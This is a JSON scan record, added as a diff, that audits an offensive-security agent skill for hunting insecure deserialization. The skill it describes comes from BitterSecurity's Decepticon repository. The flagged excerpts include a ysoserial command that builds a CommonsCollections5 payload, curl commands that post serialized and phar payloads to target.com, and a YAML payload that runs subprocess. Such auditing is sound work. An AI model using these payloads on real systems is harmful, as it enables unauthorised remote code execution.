@@ -1,0 +1,122 @@
+{
+  "id": "bittersecurity__decepticon__packages~decepticon~decepticon~skills~standard~analyst~deserialization",
+  "owner": "BitterSecurity",
+  "repo": "Decepticon",
+  "path": "packages/decepticon/decepticon/skills/standard/analyst/deserialization",
+  "name": "deserialization",
+  "description": "Hunt insecure deserialization (CWE-502) across Python pickle, Java ObjectInputStream / Jackson / SnakeYAML, .NET BinaryFormatter / DataContractJson, PHP unserialize, Ruby Marshal/YAML.load, and Node.js vm. Direct path to unauthenticated RCE.",
+  "stars": 6567,
+  "category": "coding",
+  "commit": "df879550544d36b6b1e69062f05adae28537adf2",
+  "contentHash": "72ff99beb5949f17e599d158935074465482a5a4e8b5ca7f245304f66ab9ab74",
+  "repoCreatedAt": "2025-06-06T12:55:02Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-08T09:45:03.483Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/deserialization/SKILL.md",
+        "line": 37,
+        "excerpt": "grep -rE 'pickle\\.loads?\\(|yaml\\.load\\([^)]*Loader=(FullLoader|Loader)?\\)|torch\\.load\\(' /workspace/src",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/deserialization/SKILL.md",
+        "line": 79,
+        "excerpt": "find /workspace/src -name 'pom.xml' -exec grep -lE 'commons-collections|spring-beans|xalan|bcel|commons-beanutils' {} +",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/deserialization/SKILL.md",
+        "line": 114,
+        "excerpt": "java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwn' | base64 -w0",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/deserialization/SKILL.md",
+        "line": 115,
+        "excerpt": "curl -X POST https://target.com/api/import -H \"Content-Type: application/x-java-serialized-object\" --data-binary @payload.set",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/deserialization/SKILL.md",
+        "line": 120,
+        "excerpt": "php -d phar.readonly=0 build-phar.php",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/deserialization/SKILL.md",
+        "line": 121,
+        "excerpt": "curl -F 'file=@evil.phar' https://target.com/upload",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/deserialization/SKILL.md",
+        "line": 127,
+        "excerpt": "!!python/object/new:subprocess.check_output [[\"id\"]]",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/deserialization/SKILL.md",
+        "line": 142,
+        "excerpt": "poc_command=\"curl -X POST https://target.com/api/import --data-binary @payload.bin\",",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/deserialization/SKILL.md",
+        "line": 144,
+        "excerpt": "negative_command=\"curl -X POST https://target.com/api/import --data 'benign'\",",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      }
+    ],
+    "findingTotals": {
+      "shell": 5,
+      "network": 4
+    },
+    "score": 92,
+    "band": "low",
+    "rulesVersion": "1.3.0",
+    "filesScanned": 1,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "df879550544d36b6b1e69062f05adae28537adf2",
+      "scannedAt": "2026-11-08T09:45:03.483Z",
+      "score": 92,
+      "rulesVersion": "1.3.0"
+    }
+  ]
+}
